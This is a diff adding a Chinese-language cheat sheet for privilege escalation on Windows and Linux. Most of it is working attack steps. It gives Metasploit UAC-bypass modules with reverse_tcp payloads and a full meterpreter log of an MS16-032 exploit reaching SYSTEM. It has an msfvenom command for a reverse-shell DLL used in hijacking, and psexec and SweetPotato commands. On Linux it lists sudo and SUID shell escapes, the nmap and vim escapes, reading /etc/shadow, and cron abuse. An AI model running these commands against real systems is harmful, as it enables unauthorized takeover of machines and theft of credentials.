@@ -1,0 +1,241 @@
+1.基本概念:
+Windows常见权限分类:
+User：普通用户权限；
+Administrator：管理员权限；
+System：系统权限。
+
+Linux权限分类:
+User：普通用户权限；
+www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；
+root：Linux系统最高权限。
+#通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统
+#B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。
+
+2.Windows提权:
+2.1 提权辅助脚本:
+http://bugs.hacking8.com/tiquan/将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后
+可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权；
+
+2.2 msf提权:
+2.2.1 使用getsystem（权限为Administrator时大概率会成功，其他可能需要绕UAC）
+
+①进程注入方式UAC:
+use exploit/windows/local/bypassuac
+set payload windows/meterpreter/reverse_tcp
+set LHOST=192.168.1.8
+set session 1
+exploit
+在执行getsystem
+​
+②内存注入:
+use exploit/windows/local/bypassuac_injection
+set payload windows/meterpreter/reverse_tcp
+set LHOST=192.168.1.8
+set session 1
+exploit
+在执行getsystem
+​
+③Eventvwr注册表项:
+use exploit/windows/local/bypassuac_eventvwr
+​
+④COM处理程序劫持:
+use exploit/windows/local/bypassuac_comhijack
+​
+2.2.2 会话派发到msf使用suggester辅助脚本提权:
+meterpreter > getuid    #查看权限
+Server username: HACK\testuser
+meterpreter > background #@当前激活的shell切换到后台
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) > search suggester   #查找辅助提权模块
+​
+Matching Modules
+================
+​
+#  Name                                      Disclosure Date  Rank    Check  Description
+​
+-  ----                                      ---------------  ----    -----  -----------
+​
+0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+​
+msf5 exploit(multi/handler) > use 0
+msf5 post(multi/recon/local_exploit_suggester) > sessions //查看会话
+​
+Active sessions
+===============
+​
+Id  Name  Type                     Information                      Connection
+​
+--  ----  ----                     -----------                      ----------
+​
+1         meterpreter x86/windows  HACK\testuser @ WIN-1EVLV0JUJD6  192.168.43.6:8866 -> 192.168.43.87:49394 (192.168.43.87)
+​
+msf5 post(multi/recon/local_exploit_suggester) > set session 1 //设置会话
+session => 1
+msf5 post(multi/recon/local_exploit_suggester) > exploit
+​
+[*] 192.168.43.87 - Collecting local exploits for x86/windows...
+[*] 192.168.43.87 - 30 exploit checks are being tried...
+[+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+[+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
+[+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+
+#以上为查找出来的可利用的漏洞
+msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc   #选择上面的任意一个漏洞模块进入
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options  #查看需要设置的参数
+​
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+​
+Name     Current Setting  Required  Description
+​
+----     ---------------  --------  -----------
+​
+SESSION                   yes       The session to run this module on.
+​
+​
+Exploit target:
+​
+Id  Name
+​
+--  ----
+​
+0   Windows x86
+​
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit 
+​
+[*] Started reverse TCP handler on 192.168.43.6:4444 
+[+] Compressed size: 1016
+[] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
+[*] Writing payload file, C:\Users\testuser\AppData\Local\Temp\GLDpeYcGYT.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3596
+[*] Executing exploit script...
+__ __ ___ ___   ___     ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87
+​
+# |  V  |  _|_  | |  _|___|   |_  |_  |
+# |     |_  |_| |_| . |___| | |_  |  _|
+# |_|_|_|___|_____|___|   |___|___|___|
+                    
+[by b33f -> @FuzzySec]
+​
+[?] Operating system core count: 4
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 1212
+​
+[*] Sniffing out privileged impersonation token..
+​
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 1208
+[+] Resuming thread..
+​
+[*] Sniffing out SYSTEM shell..
+​
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[] Holy handle leak Batman, we have a SYSTEM shell!!
+​
+mzCdEBgemRgjV7PHoMA8c4KLG2nLKesP
+[+] Executed on target machine.
+[*] Meterpreter session 2 opened (192.168.43.6:4444 -> 192.168.43.87:49513) at 2022-06-01 09:30:28 +0800
+[+] Deleted C:\Users\testuser\AppData\Local\Temp\GLDpeYcGYT.ps1
+​
+meterpreter > getuid  #再次查看权限已为system
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+​
+其他提权模块:
+exploit/windows/local/unquoted_service_path
+set session 1
+Exploit -j
+​
+use exploit/windows/local/service_permissions
+set sessions 1
+run
+​
+use exploit/windows/local/always_install_elevated
+set sessions 1
+run
+
+2.3 烂土豆提权:
+github：https://github.com/uknowsec/SweetPotato
+适用版本：Windows 7、8、10、2008、2012
+SweetPotato.exe -a whoami
+
+2.4 DLL劫持提权:
+使用msf生成一个DLL，替换掉应用的dll，等待应用重启（需要提前在本地测试）
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.115.34 LPORT=35650 -f dll
+
+2.5 pstools工具（适合于本地提权）:
+下载地址：https://learn.microsoft.com/zh-cn/sysinternals/downloads/
+psexec.exe -accepteula -s -i -d cmd.exe   //得到system权限的cmd
+
+
+3.Linux提权:
+3.1 内核溢出提权:
+uname -a 查看系统版本和内核信息
+使用searchsploit在kali 查找相关内核漏洞
+
+3.2 sudo提权:
+sudo --version  //查看版本
+sudo -l     //查看当前用户可以使用的sudo的命令程序
+​
+#常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权）
+利用find
+sudo find . -exec /bin/sh \   #-quit或者sudo awk 'BEGIN {system("/bin/sh")}'
+​
+#python命令提权
+sudo python -c 'import pty;pty.spawn("/bin/bash")'
+其他漏洞CVE-2019-14287、CVE-2021-3156
+
+
+3.3 suid提权:
+#查找具有suid权限文件
+find / -user root -perm -4000 -print 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+​
+#执行命令
+find filename -exec whoami \;    #以SUID即root权限执行命令
+如果是/usr/bin/bash执行bash -p     #将以root权限打开一个bash shell
+​
+#nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令)
+nmap -v   #查看版本
+root@localhost:~# nmap --interactive #交互模式
+nmap> !sh
+root@localhost:~# whoami
+root
+​
+vim:
+#Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。
+vim.tiny /etc/shadow   #读取文件
+
+vim来打开shell
+vim.tiny
+# Press ESC key
+:set shell=/bin/sh
+:shell
+
+3.4 su:
+sudo su - #使用root用户登录，不用输入root密码即可切换
+​
+利用python获取交互Shell
+python -c 'import pty;pty.spawn("/bin/sh")'
+sudo su
+
+3.5 任务计划:
+ls -l /etc/cron*
+cat /etc/crontab
+#在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升；
+#如权限配置不当777的执行脚本，则可以修改脚本内容进行提权；
+
